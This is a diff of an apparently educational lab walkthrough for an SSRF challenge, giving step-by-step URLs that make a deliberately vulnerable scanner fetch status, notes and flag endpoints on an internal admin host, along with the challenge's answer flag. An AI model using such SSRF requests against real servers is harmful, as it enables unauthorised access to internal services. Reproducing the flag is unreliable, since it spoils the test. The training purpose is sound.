@@ -1,112 +1,269 @@
-# Challenge 03 — SSRF & Internal Service Discovery
+# Challenge 3 — SSRF & Internal Service Discovery
 
-> Quick solve guide: see [CHEATSHEET.md](./CHEATSHEET.md)
+## What You Will Learn
 
-## 1. Objective
-Use the URL scanner to reach an internal-only service and retrieve the restricted objective flag.
+SSRF means **Server-Side Request Forgery**.
 
-## 2. Target
-`scanner.internal.lab`
+Simple explanation:
+- You send a URL to an application.
+- The server fetches that URL for you.
+- If controls are weak, the server may reach internal-only endpoints.
 
-## 3. Application
-URL Inspection Service that fetches submitted URLs server-side and returns diagnostic output.
+In this challenge, you will use a URL scanner to access:
 
-## 4. Learning objectives
-- SSRF basics
-- Internal service discovery
-- Server-side request boundaries
-
-## 5. Prerequisites
-- App running on `localhost:3005`
-- Dependencies installed
-
-## 6. Starting the lab
-```bash
-npm install
-npm run dev -- -p 3005
+```text
+internal-admin.internal.lab
 ```
 
-## 7. Verify the target
-- Browser: `http://localhost:3005/targets/scanner`
-- Optional hostname mode: `http://scanner.internal.lab:3005/`
+and retrieve the challenge flag.
 
-## 8. Challenge walkthrough
-1) Probe scanner behavior with invalid input:
-- Method: `POST`
-- Endpoint: `/api/scanner/api/scan`
-- Body:
+## Before You Start
+
+1. Ensure lab is running on `http://localhost:3005`.
+2. Keep the dev server terminal open.
+3. Open browser.
+
+WARNING:
+The **Service URL** field expects a URL.
+
+Do NOT enter the flag into **Service URL**.
+
+Use the separate **Flag** field under **Flag submission** for the flag.
+
+## Step 1 — Open the Challenge Page
+
+1. Open your browser.
+2. Go to:
+
+```text
+http://localhost:3005/challenges/ssrf-internal-service-discovery
+```
+
+What You Should See:
+- Title **SSRF & Internal Service Discovery**.
+- **Open target** button.
+- **Reset lab** button.
+- Evidence panel.
+
+## Step 2 — Open the URL Inspection Service
+
+1. Click **Open target**.
+
+Direct URL (same page):
+
+```text
+http://localhost:3005/targets/scanner
+```
+
+What You Should See:
+- Header **URL Inspection Service**.
+- Input label **Service URL**.
+- Button **Scan URL**.
+- Right panel section **Flag submission**.
+- Flag input label **Flag**.
+- Button **Submit Flag**.
+
+## Step 3 — Test Invalid URL Handling
+
+1. Click inside **Service URL**.
+2. Remove existing text.
+3. Enter:
+
+```text
+not-a-url
+```
+
+4. Click **Scan URL**.
+
+What You Should See:
+- Status message near the form:
+
+```text
+Scan returned an error response. Review status and payload.
+```
+
+- In **Scan result** JSON panel:
+
 ```json
-{"url":"not-a-url"}
+{"status":400,"error":"invalid url"}
 ```
-- Expected: `400` invalid URL
 
-2) Test non-allowed external destination:
-- Method: `POST`
-- Endpoint: `/api/scanner/api/scan`
-- Body:
+## Step 4 — Test Blocked External Destination
+
+1. In **Service URL**, enter:
+
+```text
+http://example.com/
+```
+
+2. Click **Scan URL**.
+
+What You Should See:
+- JSON shows external destination is blocked:
+
 ```json
-{"url":"http://example.com/"}
+{"status":403,"error":"destination is outside the inspection network"}
 ```
-- Expected: `403` outside inspection network
 
-3) Enumerate internal service:
-- Method: `POST`
-- Endpoint: `/api/scanner/api/scan`
-- Body:
-```json
-{"url":"http://internal-admin.internal.lab/api/status"}
+## Step 5 — Query the Internal Status Endpoint
+
+1. In **Service URL**, enter:
+
+```text
+http://internal-admin.internal.lab/api/status
 ```
-- Expected: `200` with internal status
 
-4) Retrieve internal objective:
-- Method: `POST`
-- Endpoint: `/api/scanner/api/scan`
-- Body:
-```json
-{"url":"http://internal-admin.internal.lab/api/flag"}
+2. Click **Scan URL**.
+
+What You Should See:
+- Status message:
+
+```text
+Scan completed successfully.
 ```
-- Expected: `200` with `CYBERLAB{ssrf_internal_network}`
 
-5) Submit flag:
-- Method: `POST`
-- Endpoint: `/api/scanner/submit`
-- Body:
-```json
-{"flag":"CYBERLAB{ssrf_internal_network}"}
+- JSON contains:
+	- `upstreamStatus: 200`
+	- `service: internal-admin`
+	- `hostname: internal-admin.internal.lab`
+
+## Step 6 — Discover the Hint Endpoint
+
+1. In **Service URL**, enter:
+
+```text
+http://internal-admin.internal.lab/api/notes
 ```
-- Expected: `{ "accepted": true }`
 
-## 9. Why it works
-The scanner is intentionally allowed to call an internal service (`internal-admin.internal.lab`) and returns upstream output.
+2. Click **Scan URL**.
 
-## 10. Completion condition
-- Restricted internal response is retrieved
-- Correct flag is submitted
+What You Should See:
+- JSON includes `notes` with a hint mentioning `/api/flag`.
 
-## 11. How to verify completion
-- Visit `/challenges/ssrf-internal-service-discovery`
-- Evidence count includes `retrieved` and `submitted`
+## Step 7 — Retrieve the Flag
 
-## 12. Resetting the challenge
-- Method: `POST`
-- Endpoint: `/api/scanner/reset`
-- Expected: progress/session reset
+1. In **Service URL**, enter:
 
-## 13. Troubleshooting
-- URL always rejected: ensure hostname is `internal-admin.internal.lab`.
-- Upstream JSON parse error: retry with `/api/status`, `/api/notes`, or `/api/flag`.
-- Challenge not completing: retrieve `/api/flag` before submitting.
-- DNS/hostname confusion: this challenge performs server-side routing internally.
+```text
+http://internal-admin.internal.lab/api/flag
+```
 
-## 14. Expected behavior
-- Invalid URLs fail safely.
-- External destinations are blocked.
-- Internal admin endpoints are reachable only through scanner flow.
+2. Click **Scan URL**.
 
-## 15. Security lesson
-Server-side URL fetch features can be abused for internal recon/data access when destination controls are weak.
+What You Should See:
+- JSON includes:
 
-## 16. Developer notes
-- Scanner API: `src/app/api/scanner/[...path]/route.ts`
-- Internal service route: `src/app/api/internal-admin/[...path]/route.ts`
-- Session cookie name: `scanner_session`
+```text
+CYBERLAB{ssrf_internal_network}
+```
+
+IMPORTANT:
+Copy the flag value exactly.
+
+## Step 8 — Submit the Flag Correctly
+
+1. In the right panel, locate **Flag submission**.
+2. Click inside the **Flag** input field.
+3. Enter:
+
+```text
+CYBERLAB{ssrf_internal_network}
+```
+
+4. Click **Submit Flag**.
+
+What You Should See on target page:
+- Message:
+
+```text
+Flag accepted. Challenge complete.
+```
+
+## Step 9 — Verify Completion on Challenge Page
+
+1. Return to:
+
+```text
+http://localhost:3005/challenges/ssrf-internal-service-discovery
+```
+
+2. Confirm:
+	 - Evidence count is `6/6`.
+	 - `Retrieve restricted information` is complete.
+	 - `Submit flag` is complete.
+
+## How to Reset the Challenge
+
+1. On the challenge page, click **Reset lab**.
+
+What You Should See:
+
+```text
+Lab reset. Start a fresh SSRF investigation.
+```
+
+Evidence should return to incomplete.
+
+## Verified API Endpoints (Reference)
+
+- Scan: `POST /api/scanner/api/scan`
+- Progress: `GET /api/scanner/api/progress`
+- Submit: `POST /api/scanner/submit`
+- Reset: `POST /api/scanner/reset`
+
+Internal endpoints (scanner reaches these server-side):
+- `GET /api/internal-admin/api/status`
+- `GET /api/internal-admin/api/notes`
+- `GET /api/internal-admin/api/flag`
+
+## Troubleshooting
+
+### Problem: You pasted flag into Service URL
+
+Fix:
+1. Clear **Service URL**.
+2. Put only URLs in **Service URL**.
+3. Put flag in **Flag** field under **Flag submission**.
+
+### Problem: `invalid url`
+
+Cause:
+- Missing `http://` or malformed URL.
+
+Fix:
+Use full URL format, for example:
+
+```text
+http://internal-admin.internal.lab/api/status
+```
+
+### Problem: `destination is outside the inspection network`
+
+Cause:
+- Hostname is not allowed.
+
+Fix:
+Use `internal-admin.internal.lab` with one of the verified paths.
+
+### Problem: Flag submission rejected
+
+Cause:
+- Wrong flag text or flag not retrieved first.
+
+Fix:
+1. Re-run Step 7 to retrieve `/api/flag`.
+2. Submit exact value:
+
+```text
+CYBERLAB{ssrf_internal_network}
+```
+
+3. If still failing, click **Reset lab** and repeat Steps 5–8.
+
+## Challenge Complete
+
+You are done when all are true:
+
+- Target page shows **Flag accepted. Challenge complete.**
+- Challenge page evidence reaches `6/6`.
+- Both `retrieved` and `submitted` objectives are complete.
